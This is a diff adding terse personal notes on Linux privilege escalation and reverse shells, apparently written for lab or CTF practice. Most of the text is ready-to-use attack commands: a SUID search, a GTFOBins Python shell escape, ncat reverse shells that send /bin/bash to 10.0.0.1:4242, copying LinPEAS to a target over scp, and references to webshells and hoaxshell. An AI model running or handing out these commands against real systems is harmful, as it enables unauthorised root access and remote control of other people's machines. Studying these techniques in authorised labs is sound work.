@@ -1,0 +1,63 @@
+priv escalation 
+
+ls -la 
+uname -a
+
+
+source: https://github.com/frizb/Linux-Privilege-Escalation
+
+suid 
+echo $path 
+	to check the path
+find / -type f -perm -u=s 2>>/dev/null
+									/dev/null will filter out the error
+or
+find / -user root -perm /4000 
+	/usr/../python
+gtfobins site (https://gtfobins.github.io/gtfobins/python)
+	search python
+	
+	/usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+	
+	
+									
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+REVERSE SHELL!!!!!
+LIN PEAsS 
+	PRIVILEGE ESCALATION AWESOME SCRIPT SUITE 
+	
+	
+	
+reverse shell
+	send nc.exe to the target machine 
+	then use https://www.revshells.com/ to generate a payload and then run it in the target machine
+	this can be done using either a webshell or direct run
+
+netcat :
+	nc.exe should be in the target's machine
+	ncat 10.0.0.1 4242 -e /bin/bash
+  	ncat --udp 10.0.0.1 4242 -e /bin/bash	
+	
+	
+	
+scp /usr/share/linpeas jan@10.10.159.107:/dev/shm
+	
+	this will copy the file from the local host to the ssh server 
+	scp= secure copy
+	
+	
+hoaxshell
